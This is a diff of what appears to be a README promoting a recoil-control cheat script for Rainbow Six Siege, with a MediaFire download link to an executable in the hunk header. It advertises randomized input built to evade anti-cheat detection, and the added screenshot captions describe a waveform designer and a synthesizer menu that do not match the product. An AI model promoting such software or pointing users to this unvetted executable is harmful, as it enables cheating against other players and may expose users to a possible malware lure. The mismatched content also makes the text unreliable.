@@ -11,6 +11,8 @@ https://www.mediafire.com/file/3y5ncrf12wl4t2d/R6_Recoil_Script.exe/file
 🚀 Ultimate Rainbow Six Siege Enhancement Script
 Welcome to the most customizable and feature-rich script designed to elevate your gameplay in Rainbow Six Siege. Engineered for precision, fluidity, and safety, this script bridges the gap between raw skill and perfect execution.
 
+📸 [SCREENSHOT: Main Dashboard / Operator Selection Screen - Refer to file image_99039d.png]
+
 
 ⚡ Key Features
 
@@ -18,6 +20,9 @@ Welcome to the most customizable and feature-rich script designed to elevate you
 * Per-Weapon Tuning: Fine-tune vertical and horizontal recoil compensation to match your favorite operators perfectly.
 * Humanized Randomization: Built-in micro-variations prevent detection and mimic natural mouse movement.
 * On-the-Fly Adjustments: Tweak your recoil strengths mid-game using simple hotkeys.
+
+📸 [SCREENSHOT: Waveform Pattern Designer - Refer to file image_98ff64.png]
+📸 [SCREENSHOT: Synthesizer Fine Tuning Menu - Refer to file image_990322.png]
 
 ⌨️ Dynamic Keybinds
 * Fully Remap: Assign every single feature to any key on your keyboard or extra mouse buttons.
